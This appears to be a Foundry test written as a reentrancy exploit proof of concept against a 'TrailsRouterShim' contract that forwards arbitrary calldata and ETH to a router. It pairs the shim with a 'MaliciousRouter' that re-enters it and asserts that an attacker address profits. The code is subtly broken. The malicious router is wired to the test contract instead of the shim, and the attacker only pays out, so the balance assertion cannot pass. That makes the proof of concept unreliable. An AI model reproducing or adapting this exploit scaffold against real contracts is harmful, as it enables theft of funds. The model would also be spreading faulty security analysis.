// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IRouter {
    function vulnerableFunction() external payable;
}

contract TrailsRouterShim {
    address public ROUTER;

    constructor(address _router) {
        ROUTER = _router;
    }

    function _forwardToRouter(bytes memory forwardData, uint256 callValue) internal returns (bytes memory) {
        (bool success, bytes memory ret) = ROUTER.call{value: callValue}(forwardData);
        if (!success) {
            revert("RouterCallFailed");
        }
        return ret;
    }

    function triggerForward(bytes memory forwardData) external payable {
        _forwardToRouter(forwardData, msg.value);
    }
}

contract MaliciousRouter {
    address public shim;
    bool public reentered;

    constructor(address _shim) {
        shim = _shim;
    }

    function vulnerableFunction() external payable {
        if (!reentered) {
            reentered = true;
            TrailsRouterShim(shim).triggerForward{value: msg.value}(abi.encodeWithSignature("vulnerableFunction()"));
        }
    }
}

contract ExploitTest is Test {
    TrailsRouterShim shim;
    MaliciousRouter maliciousRouter;
    address attacker = address(0xdeadbeef);

    function setUp() public {
        // Deploy the malicious router
        maliciousRouter = new MaliciousRouter(address(this));

        // Deploy the TrailsRouterShim with the malicious router address
        shim = new TrailsRouterShim(address(maliciousRouter));

        // Fund the attacker
        vm.deal(attacker, 10 ether);
    }

    function test_exploit() public {
        // Initial balance of the attacker
        uint256 initialBalance = attacker.balance;

        // Attacker triggers the exploit
        vm.prank(attacker);
        shim.triggerForward{value: 1 ether}(abi.encodeWithSignature("vulnerableFunction()"));

        // Assert that the attacker was able to extract more than entitled
        assertGt(attacker.balance, initialBalance);
    }
}